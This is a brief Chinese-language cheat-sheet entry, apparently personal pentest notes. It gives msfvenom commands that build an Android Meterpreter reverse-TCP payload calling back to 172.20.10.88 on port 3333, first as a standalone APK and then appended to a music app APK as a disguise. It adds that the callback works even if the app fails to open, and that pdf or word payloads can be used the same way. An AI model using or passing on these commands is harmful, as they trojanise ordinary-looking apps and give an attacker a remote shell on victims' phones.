`msfvenom -p android/meterpreter/reverse_tcp lhost=172.20.10.88 lport=3333 R > en.apk`

加一个 `R` 可以正常使用

`msfvenom -p android/meterpreter/reverse_tcp lhost=172.20.10.88 lport=3333 R >> 废柴音乐v2.0.apk`

附加模版上去，不一定能打开，但一定能连返回链接

> 可以使用类似的`pdf`，`word` 等 ayload 来实现返回链接
